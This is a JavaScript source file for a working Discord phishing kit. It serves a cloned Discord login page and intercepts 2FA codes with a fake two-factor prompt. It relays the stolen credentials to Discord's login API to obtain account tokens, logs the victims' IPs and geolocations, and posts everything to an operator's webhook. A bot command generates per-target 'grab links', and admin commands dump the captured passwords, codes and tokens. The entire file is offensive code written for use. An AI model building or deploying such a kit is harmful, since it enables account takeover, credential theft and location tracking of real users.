// node 18+ | zero deps beyond discord.js
// file: index.js

import {
  Client, GatewayIntentBits, PermissionFlagsBits, EmbedBuilder,
} from "discord.js";
import { createServer } from "http";
import { readFile, writeFile, access } from "fs/promises";
import { constants } from "fs";

const TOKEN      = process.env.BOT_TOKEN    ?? "FILL: bot token";
const PORT       = 25689;
const WEBHOOK    = process.env.LOG_WEBHOOK  ?? "FILL: discord webhook url";
const BASE_URL   = process.env.BASE_URL     ?? "https://g0j73tuxuu.apps.bot-hosting.cloud";
const IPINFO_TOK = process.env.IPINFO_TOKEN ?? "";
const LOG_FILE   = "./ip_log.json";
const PREFIX     = "!";

// ── storage ───────────────────────────────────────────────────────────────────
async function loadLog() {
  try {
    await access(LOG_FILE, constants.F_OK);
    return JSON.parse(await readFile(LOG_FILE, "utf8"));
  } catch { return []; }
}
async function appendLog(e) {
  const log = await loadLog();
  log.push(e);
  await writeFile(LOG_FILE, JSON.stringify(log, null, 2));
}
async function wipeLog() {
  await writeFile(LOG_FILE, "[]");
}

// ── discord auth ──────────────────────────────────────────────────────────────
async function grabToken(email, password) {
  try {
    const r = await fetch("https://discord.com/api/v9/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "X-Super-Properties": Buffer.from(JSON.stringify({
          os: "Windows", browser: "Chrome", device: "",
          browser_version: "120.0.0.0", os_version: "10",
        })).toString("base64"),
      },
      body: JSON.stringify({
        login: email, password,
        undelete: false, captcha_key: null,
        login_source: null, gift_code_sku_id: null,
      }),
    });
    return await r.json();
  } catch (e) { return { error: e.message }; }
}

async function grabMFA(ticket, code) {
  try {
    const r = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      },
      body: JSON.stringify({ code, ticket }),
    });
    return await r.json();
  } catch (e) { return { error: e.message }; }
}

// ── geo ───────────────────────────────────────────────────────────────────────
async function geo(ip) {
  try {
    const url = IPINFO_TOK
      ? `https://ipinfo.io/${ip}?token=${IPINFO_TOK}`
      : `https://ipinfo.io/${ip}/json`;
    const r = await fetch(url);
    if (r.ok) return await r.json();
  } catch {}
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,proxy,hosting,mobile,query`
    );
    const d = await r.json();
    if (d.status === "success") return {
      ip: d.query, city: d.city, region: d.regionName,
      country: d.country, postal: d.zip,
      loc: `${d.lat},${d.lon}`, org: d.isp,
      proxy: d.proxy, hosting: d.hosting, mobile: d.mobile,
    };
  } catch {}
  return {};
}

// ── webhook ───────────────────────────────────────────────────────────────────
async function pingWebhook(entry, g) {
  if (!WEBHOOK || WEBHOOK.startsWith("FILL")) return;
  const maps = g.loc ? `[open](https://www.google.com/maps?q=${g.loc})` : "?";
  const fields = [
    { name: "IP",      value: `\`${entry.ip}\``,             inline: true  },
    { name: "UID",     value: `\`${entry.uid ?? "?"}\``,     inline: true  },
    { name: "Country", value: g.country ?? "?",              inline: true  },
    { name: "City",    value: g.city    ?? "?",              inline: true  },
    { name: "Coords",  value: maps,                          inline: true  },
    { name: "ISP",     value: g.org     ?? "?",              inline: true  },
    { name: "Proxy",   value: String(g.proxy ?? "?"),        inline: true  },
    { name: "UA",      value: `\`${(entry.ua ?? "").slice(0,80)}\``, inline: false },
    ...(entry.email      ? [{ name: "📧 Email",    value: `\`${entry.email}\``,      inline: false }] : []),
    ...(entry.pass       ? [{ name: "🔑 Password", value: `\`${entry.pass}\``,       inline: false }] : []),
    ...(entry.mfa_code   ? [{ name: "🔢 2FA Code", value: `\`${entry.mfa_code}\``,   inline: false }] : []),
    ...(entry.token      ? [{ name: "✅ Token",    value: `\`${entry.token}\``,      inline: false }] : []),
    ...(entry.mfa_ticket ? [{ name: "⚠️ MFA Ticket", value: `\`${entry.mfa_ticket}\``, inline: false }] : []),
  ];
  await fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{ title: "🎣 login grab", color: 0xff4444, fields, timestamp: new Date().toISOString() }]
    }),
  }).catch(() => {});
}

// ── body parser ───────────────────────────────────────────────────────────────
function readBody(req) {
  return new Promise((res, rej) => {
    let buf = "";
    req.on("data", c => buf += c);
    req.on("end", () => { try { res(JSON.parse(buf)); } catch { res({}); } });
    req.on("error", rej);
  });
}

// ── safe url parse ────────────────────────────────────────────────────────────
function parseURL(raw) {
  try {
    return new URL((raw ?? "/").replace(/^\/\/+/, "/"), "http://localhost");
  } catch { return new URL("/", "http://localhost"); }
}

// ── pages ─────────────────────────────────────────────────────────────────────
function loginPage(uid, to) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord</title>
<link rel="icon" href="https://discord.com/assets/favicon.ico">
<style>
@import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#313338;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif}
.wrap{background:#2b2d31;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.5);display:flex;width:784px;max-width:95vw;overflow:hidden}
.left{padding:32px 40px;flex:1}
.right{background:#2b2d31;display:flex;align-items:center;justify-content:center;flex:0 0 340px;padding:0 40px}
.right img{width:100%;max-width:260px}
@media(max-width:600px){.wrap{flex-direction:column}.right{display:none}}
h1{color:#fff;font-size:24px;font-weight:700;text-align:center;margin-bottom:4px}
.sub{color:#949ba4;font-size:14px;text-align:center;margin-bottom:20px}
.field{margin-bottom:16px}
label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
label span{color:#f23f42;margin-left:2px}
input{width:100%;padding:10px;border-radius:4px;border:1px solid #1e1f22;background:#1e1f22;color:#dbdee1;font-size:16px;outline:none;transition:border .15s}
input:focus{border-color:#5865f2}
input.err-input{border-color:#f23f42}
.forgot{color:#00a8fc;font-size:14px;cursor:pointer;display:inline-block;margin-top:4px}
.forgot:hover{text-decoration:underline}
.btn{width:100%;padding:11px;border:none;border-radius:4px;background:#5865f2;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px;transition:background .15s}
.btn:hover{background:#4752c4}
.btn:disabled{opacity:.6;cursor:not-allowed}
.err{color:#f23f42;font-size:14px;margin-top:4px;min-height:18px;display:flex;align-items:center;gap:4px}
.register{margin-top:16px;font-size:14px;color:#949ba4}
.register a{color:#00a8fc;text-decoration:none}
.register a:hover{text-decoration:underline}
.divider{display:flex;align-items:center;gap:8px;margin:16px 0;color:#4e5058;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#3f4147}
.qr-btn{width:100%;padding:11px;border:1px solid #4e5058;border-radius:4px;background:transparent;color:#dbdee1;font-size:14px;cursor:pointer;transition:background .15s}
.qr-btn:hover{background:#3f4147}
</style>
</head>
<body>
<div class="wrap">
  <div class="left">
    <h1>Welcome back!</h1>
    <div class="sub">We're so excited to see you again!</div>
    <div class="field">
      <label>Email or Phone Number <span>*</span></label>
      <input type="text" id="email" autocomplete="email" autofocus>
      <div class="err" id="email-err"></div>
    </div>
    <div class="field">
      <label>Password <span>*</span></label>
      <input type="password" id="pass" autocomplete="current-password">
      <div class="err" id="pass-err"></div>
    </div>
    <a class="forgot" href="#">Forgot your password?</a>
    <div class="err" id="main-err"></div>
    <button class="btn" id="btn" onclick="doLogin()">Log In</button>
    <div class="register">Need an account? <a href="#">Register</a></div>
    <div class="divider">or</div>
    <button class="qr-btn">Log in with QR Code</button>
  </div>
  <div class="right">
    <svg width="260" height="200" viewBox="0 0 260 200" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="130" cy="100" r="60" fill="#5865F2" opacity=".15"/>
      <path d="M160 70a80 80 0 0 0-16.6-5.2 55.6 55.6 0 0 0-2.4 5 74 74 0 0 0-22 0 54 54 0 0 0-2.5-5A79.8 79.8 0 0 0 100 70C85 92 81 113.5 83 134.7a80.5 80.5 0 0 0 24.6 12.4 60.8 60.8 0 0 0 5-8.2 52.3 52.3 0 0 1-8.2-4l2-1.4a57.3 57.3 0 0 0 49.4 0l1.9 1.5a52 52 0 0 1-8.2 3.9 60.5 60.5 0 0 0 5 8.2 80.3 80.3 0 0 0 24.5-12.4C181 113 176.5 91.6 160 70ZM113.7 122.2c-4.8 0-8.7-4.4-8.7-9.8s3.8-9.8 8.7-9.8c4.8 0 8.8 4.4 8.6 9.8 0 5.4-3.8 9.8-8.6 9.8Zm32.2 0c-4.8 0-8.7-4.4-8.7-9.8s3.8-9.8 8.7-9.8c4.8 0 8.7 4.4 8.7 9.8 0 5.4-3.9 9.8-8.7 9.8Z" fill="#5865F2"/>
    </svg>
  </div>
</div>

<!-- MFA modal -->
<div id="mfa-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center">
  <div style="background:#2b2d31;border-radius:8px;padding:32px;width:440px;max-width:95vw;text-align:center">
    <h2 style="color:#fff;font-size:20px;margin-bottom:8px">Two-factor authentication</h2>
    <p style="color:#949ba4;font-size:14px;margin-bottom:20px">Open your two-factor authenticator (TOTP) app or browser extension to view your authentication code.</p>
    <div class="field" style="text-align:left">
      <label>6-digit authentication code <span style="color:#f23f42">*</span></label>
      <input type="text" id="mfa-code" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" style="width:100%;padding:10px;border-radius:4px;border:1px solid #1e1f22;background:#1e1f22;color:#dbdee1;font-size:16px;outline:none">
      <div class="err" id="mfa-err"></div>
    </div>
    <button class="btn" id="mfa-btn" onclick="doMFA()" style="margin-top:8px">Log In</button>
    <div style="margin-top:12px"><a href="#" style="color:#00a8fc;font-size:14px">Use a backup code instead</a></div>
  </div>
</div>

<script>
let _ticket = null;

function setLoading(loading) {
  const btn = document.getElementById("btn");
  btn.disabled = loading;
  btn.textContent = loading ? "Logging in..." : "Log In";
}

function clearErrors() {
  ["email-err","pass-err","main-err"].forEach(id => {
    document.getElementById(id).textContent = "";
  });
  document.getElementById("email").classList.remove("err-input");
  document.getElementById("pass").classList.remove("err-input");
}

async function doLogin() {
  clearErrors();
  const email = document.getElementById("email").value.trim();
  const pass  = document.getElementById("pass").value;

  if (!email) {
    document.getElementById("email-err").textContent = "This field is required.";
    document.getElementById("email").classList.add("err-input");
    return;
  }
  if (!pass) {
    document.getElementById("pass-err").textContent = "This field is required.";
    document.getElementById("pass").classList.add("err-input");
    return;
  }

  setLoading(true);

  try {
    const r = await fetch("/auth", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ uid: "${uid}", to: "${to}", email, pass }),
    });
    const d = await r.json();

    if (d.ok) {
      window.location.href = "${to}";
    } else if (d.mfa) {
      _ticket = d.ticket;
      setLoading(false);
      const ov = document.getElementById("mfa-overlay");
      ov.style.display = "flex";
      setTimeout(() => document.getElementById("mfa-code").focus(), 100);
    } else {
      document.getElementById("main-err").innerHTML = "&#9888; " + (d.msg ?? "Login or password is invalid.");
      document.getElementById("email").classList.add("err-input");
      document.getElementById("pass").classList.add("err-input");
      setLoading(false);
    }
  } catch {
    document.getElementById("main-err").textContent = "Login or password is invalid.";
    setLoading(false);
  }
}

async function doMFA() {
  const code = document.getElementById("mfa-code").value.trim();
  const btn  = document.getElementById("mfa-btn");
  const err  = document.getElementById("mfa-err");

  if (!code || code.length < 6) { err.textContent = "Please enter your 6-digit code."; return; }

  btn.disabled = true;
  btn.textContent = "Verifying...";
  err.textContent = "";

  try {
    const r = await fetch("/mfa", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ticket: _ticket, code }),
    });
    const d = await r.json();
    if (d.ok) {
      window.location.href = "${to}";
    } else {
      err.textContent = "Invalid two-factor code.";
      btn.disabled = false;
      btn.textContent = "Log In";
    }
  } catch {
    err.textContent = "Invalid two-factor code.";
    btn.disabled = false;
    btn.textContent = "Log In";
  }
}

document.addEventListener("keydown", e => {
  if (e.key !== "Enter") return;
  if (document.getElementById("mfa-overlay").style.display === "flex") doMFA();
  else doLogin();
});
</script>
</body>
</html>`;
}

// ── http server ───────────────────────────────────────────────────────────────
createServer(async (req, res) => {
  const u = parseURL(req.url);

  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }

  // POST /auth
  if (req.method === "POST" && u.pathname === "/auth") {
    const body = await readBody(req);
    const ip = (
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ??
      req.socket.remoteAddress
    ).replace("::ffff:", "");

    const { uid, email, pass } = body;
    const authResult = await grabToken(email, pass);

    const entry = {
      ts:         new Date().toISOString(),
      ip,
      ua:         req.headers["user-agent"] ?? "unknown",
      uid:        uid   ?? null,
      email:      email ?? null,
      pass:       pass  ?? null,
      token:      authResult.token   ?? null,
      mfa:        authResult.mfa     ?? false,
      mfa_ticket: authResult.ticket  ?? null,
    };
    const g = await geo(ip);
    entry.geo = g;
    await appendLog(entry);
    await pingWebhook(entry, g);
    console.log("[auth]", ip, email, authResult.token ? "TOKEN" : authResult.mfa ? "MFA" : "FAIL");

    if (authResult.token) {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    } else if (authResult.mfa) {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: false, mfa: true, ticket: authResult.ticket }));
    } else {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: false, msg: "Login or password is invalid." }));
    }
    return;
  }

  // POST /mfa
  if (req.method === "POST" && u.pathname === "/mfa") {
    const body = await readBody(req);
    const ip = (
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ??
      req.socket.remoteAddress
    ).replace("::ffff:", "");

    const { ticket, code } = body;
    const mfaResult = await grabMFA(ticket, code);

    const entry = {
      ts:       new Date().toISOString(),
      ip,
      ua:       req.headers["user-agent"] ?? "unknown",
      mfa_code: code             ?? null,
      token:    mfaResult.token  ?? null,
    };
    const g = await geo(ip);
    entry.geo = g;
    await appendLog(entry);
    await pingWebhook(entry, g);
    console.log("[mfa]", ip, code, mfaResult.token ? "TOKEN" : "FAIL");

    if (mfaResult.token) {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    } else {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: false }));
    }
    return;
  }

  // GET /
  if (req.method === "GET" && u.pathname === "/") {
    const uid = u.searchParams.get("uid") ?? "";
    const to  = u.searchParams.get("to")  ?? "https://discord.com/app";
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(loginPage(uid, to));
    return;
  }

  res.writeHead(404); res.end();
}).listen(PORT, "0.0.0.0", () => console.log(`[receiver] :${PORT} on 0.0.0.0`));

// ── discord bot ───────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
});

client.once("clientReady", () => console.log(`[logger] online as ${client.user.tag}`));

client.on("messageCreate", async (msg) => {
  if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
  const [cmd, ...args] = msg.content.slice(PREFIX.length).trim().split(/\s+/);

  if (cmd === "genlink") {
    const target = msg.mentions.users.first() ?? msg.author;
    const to     = args.find(a => a.startsWith("http")) ?? "https://discord.com/app";
    const link   = `${BASE_URL}/?uid=${target.id}&to=${encodeURIComponent(to)}`;
    try {
      await msg.author.send(`🔗 grab link for \`${target.tag}\`:\n${link}`);
      await msg.delete();
    } catch { await msg.reply("open DMs and retry"); }
    return;
  }

  if (cmd === "logs") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    const n   = parseInt(args[0]) || 20;
    const log = await loadLog();
    if (!log.length) { await msg.reply("no hits yet"); return; }
    let buf = "";
    for (const e of log.slice(-n)) {
      const g = e.geo ?? {};
      const line = [
        `ts=${e.ts}`, `ip=${e.ip}`, `uid=${e.uid ?? "?"}`,
        `city=${g.city ?? "?"}`, `country=${g.country ?? "?"}`,
        e.email    ? `email=${e.email}`                    : null,
        e.pass     ? `pass=${e.pass}`                      : null,
        e.mfa_code ? `2fa=${e.mfa_code}`                   : null,
        e.token    ? `token=${e.token.slice(0,20)}…`       : null,
      ].filter(Boolean).join(" | ") + "\n";
      if ((buf + line).length > 1900) {
        await msg.channel.send(`\`\`\`\n${buf}\`\`\``); buf = "";
      }
      buf += line;
    }
    if (buf) await msg.channel.send(`\`\`\`\n${buf}\`\`\``);
    return;
  }

  if (cmd === "lastip") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    const target = msg.mentions.users.first();
    const log    = await loadLog();
    const hits   = target ? log.filter(e => e.uid === target.id) : log;
    if (!hits.length) { await msg.reply("no hits"); return; }
    const e  = hits[hits.length - 1];
    const g  = e.geo ?? {};
    const maps = g.loc ? `[maps](https://www.google.com/maps?q=${g.loc})` : "?";
    const em = new EmbedBuilder()
      .setTitle(`🎣 ${e.ip}`).setColor(0xff4444)
      .addFields(
        { name: "UID",     value: `\`${e.uid ?? "?"}\``,            inline: true  },
        { name: "Country", value: g.country ?? "?",                  inline: true  },
        { name: "City",    value: g.city    ?? "?",                  inline: true  },
        { name: "Coords",  value: maps,                              inline: true  },
        { name: "ISP",     value: g.org     ?? "?",                  inline: true  },
        { name: "Proxy",   value: String(g.proxy ?? "?"),            inline: true  },
        { name: "UA",      value: `\`${(e.ua ?? "").slice(0,60)}\``, inline: false },
        ...(e.email    ? [{ name: "📧 Email",    value: `\`${e.email}\``,    inline: false }] : []),
        ...(e.pass     ? [{ name: "🔑 Password", value: `\`${e.pass}\``,     inline: false }] : []),
        ...(e.mfa_code ? [{ name: "🔢 2FA",      value: `\`${e.mfa_code}\``, inline: false }] : []),
        ...(e.token    ? [{ name: "✅ Token",    value: `\`${e.token}\``,    inline: false }] : []),
      ).setTimestamp(new Date(e.ts));
    await msg.channel.send({ embeds: [em] });
    return;
  }

  if (cmd === "clearlog") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    await wipeLog();
    await msg.reply("log wiped");
    return;
  }
});

client.login(TOKEN);
